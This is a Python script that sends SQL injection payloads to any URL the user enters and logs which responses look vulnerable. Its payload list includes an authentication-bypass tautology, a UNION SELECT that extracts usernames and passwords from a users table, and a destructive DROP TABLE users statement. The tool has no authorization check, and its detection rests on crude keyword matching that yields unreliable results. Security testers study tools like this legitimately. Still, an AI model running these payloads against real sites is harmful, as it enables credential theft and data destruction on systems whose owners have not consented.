import requests
import time
import csv
from prettytable import PrettyTable
from threading import Lock

# Initialize a lock for thread safety
lock = Lock()

def send_request(url, data=None, allow_redirects=True):
    try:
        if data:
            response = requests.post(url, data=data, allow_redirects=allow_redirects)
        else:
            response = requests.get(url, allow_redirects=allow_redirects)
        return response
    except requests.RequestException as e:
        print(f"Request failed: {e}")
        return None

def test_sql_injection(url, payloads):
    table = PrettyTable(["URL", "Payload", "Vulnerability"])
    table.align["Vulnerability"] = "l"

    for payload in payloads:
        test_url = f"{url}?param={payload}"
        response = send_request(test_url)

        if response:
            # Check for common SQL injection indicators in the response
            if ("error" in response.text.lower() or 
                "syntax error" in response.text.lower() or 
                "unexpected" in response.text.lower() or 
                "database" in response.text.lower()):
                table.add_row([test_url, payload, "SQL Injection detected"])
            
            # Check for successful injection via tautology
            elif "1=1" in payload and "Welcome" in response.text:
                table.add_row([test_url, payload, "Tautology-based SQL Injection detected"])
            
            # Check for union-based injection
            elif "union" in payload.lower() and "select" in response.text.lower():
                table.add_row([test_url, payload, "Union-based SQL Injection detected"])
            
            # Check for error-based injection
            elif "mysql" in response.text.lower() or "sql" in response.text.lower():
                table.add_row([test_url, payload, "Error-based SQL Injection detected"])
        
        time.sleep(5)

    with lock:
        # Write the results to a CSV file
        with open('sql_injection_results.csv', mode='w', newline='') as file:
            writer = csv.writer(file)
            writer.writerow(table.field_names)  # Write the header
            writer.writerows(table.rows)         # Write the data rows

        # Print the table to console
        print(table)

sql_payloads = [
        "' OR '1'='1",
        "' OR '1'='1' -- ",
        "' UNION SELECT null, username, password FROM users -- ",
        "'; DROP TABLE users; -- ",
        "' OR 'x'='x",
        "' AND (SELECT COUNT(*) FROM users) > 0 -- "
    ]
if __name__ == "__main__":
    target_url = input("Enter the target url : ")
    test_sql_injection(target_url, sql_payloads)
